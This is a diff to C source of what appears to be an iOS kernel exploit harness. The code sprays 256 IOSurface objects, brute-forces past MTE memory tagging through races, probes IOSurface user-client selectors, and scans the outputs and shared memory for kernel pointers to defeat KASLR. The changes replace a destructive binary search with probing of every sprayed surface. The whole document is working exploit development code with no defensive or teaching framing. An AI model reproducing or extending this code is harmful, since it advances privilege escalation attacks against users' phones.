@@ -19283,6 +19283,7 @@ new_modes:
          */
         /* r229 variables shared between Phase 13 and Phase 14 */
         static IOSurfaceRef r229_matched_surf = NULL;
+        static IOSurfaceRef r229_spray_static[256]; /* copy for Phase 14 access */
         static int r229_matched_idx = -1;
 
         r229_phase13_top:
@@ -19972,16 +19973,35 @@ new_modes:
                     }
 
                 } else {
-                    /* === In-process binary search + confirmation ===
-                     * crash_count >= 3 confirms races fire.
-                     * Binary search: free half the spray each step.
-                     * - If crash: match in freed half (state file has range)
-                     * - If survive: match in kept half, continue in-process
-                     * - If all freed with no crash: no match, loop
-                     *
-                     * On phase=1, r229_bsearch_lo/hi carry narrowed range
-                     * from a previous crash during binary search.
+                    /* === Skip destructive binary search ===
+                     * crash_count >= 3 confirms races fire reliably.
+                     * Destructive binary search is unreliable with MTE because
+                     * state doesn't carry across fresh sprays (new spray = new
+                     * random match position). Instead, proceed to Phase 14 with
+                     * all 256 surfaces for non-destructive identification.
                      */
+                    rlog("  r=229: SKIP bsearch (crashes=%d confirms races). All %d surfaces to Phase 14\n",
+                        r229_crash_count, 256);
+                    r229_mte_match = 1;
+                    r229_match_idx = -1;
+                    {
+                        char sp[512];
+                        snprintf(sp, sizeof(sp), "%s/Documents/r229_state.bin",
+                            getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                        int one = 1, zero = 0, hi = 255;
+                        int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                        if (sfd >= 0) {
+                            write(sfd, &r229_attempt, sizeof(int));
+                            write(sfd, &r229_crash_count, sizeof(int));
+                            write(sfd, &one, sizeof(int));
+                            write(sfd, &zero, sizeof(int));
+                            write(sfd, &zero, sizeof(int));
+                            write(sfd, &hi, sizeof(int));
+                            fsync(sfd); close(sfd);
+                        }
+                        sync();
+                    }
+                    goto r229_match_done;
                     int bs_lo = r229_bsearch_lo;
                     int bs_hi = r229_bsearch_hi;
                     rlog("  r=229: BINARY PROBE: search range [%d, %d]\n", bs_lo, bs_hi);
@@ -20084,6 +20104,7 @@ new_modes:
 
                 }
 
+                r229_match_done:
                 if (r229_mte_match) {
                     rlog("\n  ========================================\n");
                     rlog("  === MTE BRUTE-FORCE SUCCESS (attempt #%d) ===\n", r229_attempt);
@@ -20094,13 +20115,17 @@ new_modes:
                         r229_spray[r229_match_idx] ? (void *)r229_spray[r229_match_idx] : NULL);
                     rlog("  crashes=%d phase=%d\n", r229_crash_count, r229_phase);
 
-                    /* Keep the matched surface alive, free everything else */
-                    for (int si = 0; si < 256; si++) {
-                        if (si == r229_match_idx) continue;
-                        if (r229_spray[si]) {
-                            CFRelease(r229_spray[si]);
-                            r229_spray[si] = NULL;
+                    if (r229_match_idx >= 0) {
+                        /* Known match — free everything else */
+                        for (int si = 0; si < 256; si++) {
+                            if (si == r229_match_idx) continue;
+                            if (r229_spray[si]) {
+                                CFRelease(r229_spray[si]);
+                                r229_spray[si] = NULL;
+                            }
                         }
+                    } else {
+                        rlog("  r=229: match_idx unknown — keeping all 256 surfaces for Phase 14 probe\n");
                     }
                     for (int wi = 0; wi < r229_wp_n; wi++) {
                         if (r229_wps[wi]) mach_port_deallocate(mach_task_self(), r229_wps[wi]);
@@ -20127,9 +20152,15 @@ new_modes:
                         sync();
                     }
 
-                    rlog("  r=229: Matched surface kept alive. Proceeding to Phase 14...\n");
-                    r229_matched_surf = r229_spray[r229_match_idx];
-                    r229_matched_idx = r229_match_idx;
+                    rlog("  r=229: Proceeding to Phase 14...\n");
+                    if (r229_match_idx >= 0) {
+                        r229_matched_surf = r229_spray[r229_match_idx];
+                        r229_matched_idx = r229_match_idx;
+                    } else {
+                        r229_matched_surf = NULL;
+                        r229_matched_idx = -1;
+                    }
+                    memcpy(r229_spray_static, r229_spray, sizeof(r229_spray));
                 } else {
                     /* Clean up any remaining spray surfaces */
                     for (int si = 0; si < 256; si++) {
@@ -20201,94 +20232,127 @@ new_modes:
                 goto phase14_done;
             }
 
-            /* 14a: Probe selectors 0-40 with surface ID as scalar input */
-            rlog("  14a: IOSurface selector probe (sel 0-40)\n");
-            IOSurfaceID match_id = 0;
+            /* 14a: Probe key selectors on spray surfaces */
+            rlog("  14a: IOSurface selector probe\n");
             IOSurfaceRef match_surf = NULL;
+            IOSurfaceID match_id = 0;
+
+            /* Determine which surfaces to probe */
+            int p14_surf_count = 0;
+            IOSurfaceRef *p14_surfs = NULL;
+            IOSurfaceID *p14_ids = NULL;
 
             if (rounds == 229 && r229_matched_idx >= 0 && r229_matched_surf) {
+                /* Single known match */
+                p14_surf_count = 1;
+                p14_surfs = &r229_matched_surf;
                 match_surf = r229_matched_surf;
                 match_id = IOSurfaceGetID(match_surf);
-                rlog("    Matched surface: idx=%d id=%u addr=%p\n",
-                    r229_matched_idx, match_id, (void *)match_surf);
-
-                /* Lock and get pixel buffer base address */
-                IOSurfaceLock(match_surf, 0, NULL);
-                void *base_addr = IOSurfaceGetBaseAddress(match_surf);
-                size_t alloc_size = IOSurfaceGetAllocSize(match_surf);
-                int width = (int)IOSurfaceGetWidth(match_surf);
-                int height = (int)IOSurfaceGetHeight(match_surf);
-                int bpr = (int)IOSurfaceGetBytesPerRow(match_surf);
-                rlog("    Pixel buffer: base=%p size=%zu %dx%d bpr=%d\n",
-                    base_addr, alloc_size, width, height, bpr);
-                IOSurfaceUnlock(match_surf, 0, NULL);
+                rlog("    Single matched surface: idx=%d id=%u\n", r229_matched_idx, match_id);
+            } else if (rounds == 229 && r229_matched_idx < 0) {
+                /* Unknown match — probe all 256 spray surfaces */
+                p14_surf_count = 0;
+                for (int si = 0; si < 256; si++) {
+                    if (r229_spray_static[si]) p14_surf_count++;
+                }
+                rlog("    Unknown match — probing all %d spray surfaces\n", p14_surf_count);
             }
 
-            for (uint32_t sel = 0; sel <= 40; sel++) {
-                if (sel == 17 || sel == 18) continue; /* skip reg/dereg */
+            /* Probe sel 0 (s_create_surface) on first surface for baseline */
+            if (p14_surf_count > 0) {
+                IOSurfaceRef first_surf = (r229_matched_idx >= 0) ? r229_matched_surf : r229_spray_static[0];
+                IOSurfaceID first_id = first_surf ? IOSurfaceGetID(first_surf) : 0;
 
-                uint64_t si[6] = {0};
-                uint32_t sic = 0;
-                uint8_t struct_in[256];
-                memset(struct_in, 0, sizeof(struct_in));
-                size_t struct_in_sz = 0;
-                uint64_t so[6] = {0};
-                uint32_t soc = 6;
-                uint8_t struct_out[4096];
-                memset(struct_out, 0, sizeof(struct_out));
-                size_t struct_out_sz = sizeof(struct_out);
+                /* Probe key selectors on first surface to see what returns data */
+                uint32_t key_sels[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16,
+                                       19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, 39, 40};
+                for (int ki = 0; ki < (int)(sizeof(key_sels)/sizeof(key_sels[0])); ki++) {
+                    uint32_t sel = key_sels[ki];
+                    uint64_t si[6] = {0};
+                    uint32_t sic = 0;
+                    uint64_t so[6] = {0};
+                    uint32_t soc = 6;
+                    uint8_t struct_out[4096];
+                    memset(struct_out, 0, sizeof(struct_out));
+                    size_t struct_out_sz = sizeof(struct_out);
 
-                /* Different calling conventions per selector */
-                if (sel == 9 || sel == 10) {
-                    /* s_set_value / s_get_value: scalar[0]=surfaceID */
-                    si[0] = match_id;
-                    sic = 1;
-                } else if (sel == 16) {
-                    /* get_surface_use_count: scalar[0]=surfaceID */
-                    si[0] = match_id;
-                    sic = 1;
-                } else if (sel == 33) {
-                    /* s_set_indexed_timestamp: scalar[0]=surfaceID, scalar[1]=index, scalar[2]=timestamp */
-                    si[0] = match_id;
-                    si[1] = 0;
-                    si[2] = 0x4141414142424242ULL;
-                    sic = 3;
-                } else if (sel == 34) {
-                    /* s_lookup_surface_from_port: (needs Mach port) */
-                    continue;
-                } else {
-                    si[0] = match_id;
-                    sic = 1;
-                }
+                    if (sel == 33) {
+                        si[0] = first_id; si[1] = 0; si[2] = 0x4141414142424242ULL; sic = 3;
+                    } else if (sel == 34) {
+                        continue;
+                    } else {
+                        si[0] = first_id; sic = 1;
+                    }
 
-                kern_return_t kr = IOConnectCallMethod(uc14, sel,
-                    si, sic, struct_in_sz ? struct_in : NULL, struct_in_sz,
-                    so, &soc, struct_out, &struct_out_sz);
+                    kern_return_t kr = IOConnectCallMethod(uc14, sel,
+                        si, sic, NULL, 0, so, &soc, struct_out, &struct_out_sz);
 
-                if (kr == KERN_SUCCESS || soc > 0 || struct_out_sz > 0) {
-                    rlog("    sel[%2u] kr=0x%x soc=%u struct_out_sz=%zu\n",
-                        sel, (uint32_t)kr, soc, struct_out_sz);
-                    if (soc > 0) {
+                    if (kr == KERN_SUCCESS || soc > 0 || struct_out_sz > 0) {
+                        rlog("    sel[%2u] kr=0x%x soc=%u sos=%zu", sel, (uint32_t)kr, soc, struct_out_sz);
                         for (uint32_t i = 0; i < soc && i < 6; i++) {
-                            rlog("      so[%u] = 0x%llx", i, (unsigned long long)so[i]);
+                            rlog(" so[%u]=0x%llx", i, (unsigned long long)so[i]);
                             if (so[i] > 0xfffffe0000000000ULL && so[i] < 0xffffffffffff0000ULL)
-                                rlog(" ** KERNEL PTR? **");
-                            rlog("\n");
+                                rlog("**KPTR**");
                         }
-                    }
-                    if (struct_out_sz > 0 && struct_out_sz <= 256) {
-                        uint64_t *p = (uint64_t *)struct_out;
-                        for (size_t i = 0; i < struct_out_sz / 8; i++) {
-                            if (p[i] > 0xfffffe0000000000ULL && p[i] < 0xffffffffffff0000ULL)
-                                rlog("      struct[%zu] = 0x%llx ** KERNEL PTR? **\n",
-                                    i * 8, (unsigned long long)p[i]);
+                        rlog("\n");
+                        if (struct_out_sz > 0 && struct_out_sz <= 512) {
+                            uint64_t *p = (uint64_t *)struct_out;
+                            for (size_t i = 0; i < struct_out_sz / 8; i++) {
+                                if (p[i] > 0xfffffe0000000000ULL && p[i] < 0xffffffffffff0000ULL)
+                                    rlog("      struct[%zu]=0x%llx **KPTR**\n", i*8, (unsigned long long)p[i]);
+                            }
                         }
+                    } else if (kr != (kern_return_t)0xE00002C2 && kr != (kern_return_t)0xE00002BC) {
+                        rlog("    sel[%2u] kr=0x%x\n", sel, (uint32_t)kr);
                     }
-                } else if (kr != (kern_return_t)0xE00002C2 &&
-                           kr != (kern_return_t)0xE00002BC) {
-                    /* Log non-trivial errors (skip badArg and unsupported) */
-                    rlog("    sel[%2u] kr=0x%x\n", sel, (uint32_t)kr);
                 }
+            }
+
+            /* 14a2: Use count delta probe — check each surface's use_count */
+            rlog("  14a2: Use count probe across %d surfaces\n", p14_surf_count);
+            if (rounds == 229 && r229_matched_idx < 0) {
+                for (int si = 0; si < 256; si++) {
+                    if (!r229_spray_static[si]) continue;
+                    IOSurfaceID sid = IOSurfaceGetID(r229_spray_static[si]);
+                    uint64_t si16[1] = { sid };
+                    uint64_t so16[1] = {0};
+                    uint32_t soc16 = 1;
+                    kern_return_t kr16 = IOConnectCallMethod(uc14, 16,
+                        si16, 1, NULL, 0, so16, &soc16, NULL, NULL);
+                    int use_count = IOSurfaceGetUseCount(r229_spray_static[si]);
+                    if (si < 5 || si == 127 || si == 128 || si == 255 || so16[0] != 0) {
+                        rlog("    spray[%d] id=%u uc_kern=%llu uc_user=%d\n",
+                            si, sid, (unsigned long long)so16[0], use_count);
+                    }
+                }
+            }
+
+            /* 14a3: Shared memory scan for kernel pointers */
+            rlog("  14a3: Shared memory scan\n");
+            {
+                int kptr_found = 0;
+                int surf_start = (r229_matched_idx >= 0) ? r229_matched_idx : 0;
+                int surf_end = (r229_matched_idx >= 0) ? r229_matched_idx + 1 : 256;
+                for (int si = surf_start; si < surf_end; si++) {
+                    IOSurfaceRef s = (r229_matched_idx >= 0) ? r229_matched_surf : r229_spray_static[si];
+                    if (!s) continue;
+                    IOSurfaceLock(s, kIOSurfaceLockReadOnly, NULL);
+                    void *base = IOSurfaceGetBaseAddress(s);
+                    size_t sz = IOSurfaceGetAllocSize(s);
+                    if (base && sz >= 8) {
+                        uint64_t *p = (uint64_t *)base;
+                        for (size_t off = 0; off < sz / 8 && off < 512; off++) {
+                            if (p[off] > 0xfffffe0000000000ULL && p[off] < 0xffffffffffff0000ULL) {
+                                rlog("    spray[%d]+0x%zx = 0x%llx **KPTR**\n",
+                                    si, off*8, (unsigned long long)p[off]);
+                                kptr_found++;
+                            }
+                        }
+                    }
+                    IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, NULL);
+                    if (kptr_found >= 10) break;
+                }
+                rlog("    shared mem kernel ptrs found: %d\n", kptr_found);
             }
 
             /* 14b: Test IOSurface property read for kernel pointer leaks */
@@ -20416,25 +20480,35 @@ new_modes:
 
             /* 14f: Probe IOSurface client connection for KASLR via struct output */
             rlog("  14f: Struct output probe for KASLR\n");
-            for (uint32_t sel = 0; sel <= 15; sel++) {
-                uint64_t si[4] = { match_id, 0, 0, 0 };
-                uint8_t sout[4096];
-                memset(sout, 0, sizeof(sout));
-                size_t sout_sz = sizeof(sout);
-                uint64_t so[6] = {0};
-                uint32_t soc = 0;
-                kern_return_t kr = IOConnectCallMethod(uc14, sel,
-                    si, 1, NULL, 0, so, &soc, sout, &sout_sz);
-                if (kr == KERN_SUCCESS && sout_sz > 0) {
-                    rlog("    sel[%2u] struct_out=%zu bytes\n", sel, sout_sz);
-                    uint64_t *p = (uint64_t *)sout;
-                    for (size_t i = 0; i < sout_sz / 8 && i < 32; i++) {
-                        if (p[i] > 0xfffffe0000000000ULL && p[i] < 0xffffffffffff0000ULL)
-                            rlog("      +0x%zx = 0x%llx ** KASLR LEAK **\n",
-                                i*8, (unsigned long long)p[i]);
-                        else if (p[i] > 0xffff000000000000ULL)
-                            rlog("      +0x%zx = 0x%llx (high)\n",
-                                i*8, (unsigned long long)p[i]);
+            {
+                int f_start = (r229_matched_idx >= 0) ? r229_matched_idx : 0;
+                int f_end = (r229_matched_idx >= 0) ? r229_matched_idx + 1 : 256;
+                int f_step = (r229_matched_idx >= 0) ? 1 : 16; /* sample every 16th when probing all */
+                for (int fi = f_start; fi < f_end; fi += f_step) {
+                    IOSurfaceRef fs = (r229_matched_idx >= 0) ? r229_matched_surf : r229_spray_static[fi];
+                    if (!fs) continue;
+                    IOSurfaceID fid = IOSurfaceGetID(fs);
+                    for (uint32_t sel = 0; sel <= 15; sel++) {
+                        uint64_t si[4] = { fid, 0, 0, 0 };
+                        uint8_t sout[4096];
+                        memset(sout, 0, sizeof(sout));
+                        size_t sout_sz = sizeof(sout);
+                        uint64_t so[6] = {0};
+                        uint32_t soc = 0;
+                        kern_return_t kr = IOConnectCallMethod(uc14, sel,
+                            si, 1, NULL, 0, so, &soc, sout, &sout_sz);
+                        if (kr == KERN_SUCCESS && sout_sz > 0) {
+                            rlog("    spray[%d] sel[%2u] struct_out=%zu bytes\n", fi, sel, sout_sz);
+                            uint64_t *p = (uint64_t *)sout;
+                            for (size_t i = 0; i < sout_sz / 8 && i < 32; i++) {
+                                if (p[i] > 0xfffffe0000000000ULL && p[i] < 0xffffffffffff0000ULL)
+                                    rlog("      +0x%zx = 0x%llx ** KASLR LEAK **\n",
+                                        i*8, (unsigned long long)p[i]);
+                                else if (p[i] > 0xffff000000000000ULL)
+                                    rlog("      +0x%zx = 0x%llx (high)\n",
+                                        i*8, (unsigned long long)p[i]);
+                            }
+                        }
                     }
                 }
             }
